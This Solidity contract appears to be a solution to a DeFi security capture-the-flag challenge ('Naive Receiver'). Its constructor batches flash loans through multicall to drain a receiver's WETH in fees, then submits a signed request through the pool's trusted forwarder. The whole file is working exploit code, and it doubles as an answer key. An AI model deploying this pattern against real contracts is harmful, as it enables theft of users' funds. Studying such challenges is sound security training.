// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {WETH, NaiveReceiverPool} from "./NaiveReceiverPool.sol";
import {BasicForwarder} from "./BasicForwarder.sol";
import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";

contract NaiveReceiveRescuer {
    constructor(
        NaiveReceiverPool pool,
        FlashLoanReceiver receiver,
        BasicForwarder.Request memory request,
        bytes memory signature
    ) {
        WETH weth = pool.weth();
        uint256 fee = pool.flashFee(address(weth), 0);
        uint256 balance = weth.balanceOf(address(receiver));
        uint256 calls = balance / fee;
        bytes[] memory multiCallData = new bytes[](calls);
        for (uint256 i; i < calls; i++) {
            multiCallData[i] = abi.encodeWithSelector(
                pool.flashLoan.selector,
                receiver,
                address(weth),
                1 ether,
                bytes("")
            );
        }
        pool.multicall(multiCallData);
        BasicForwarder(pool.trustedForwarder()).execute(request, signature);
    }
}
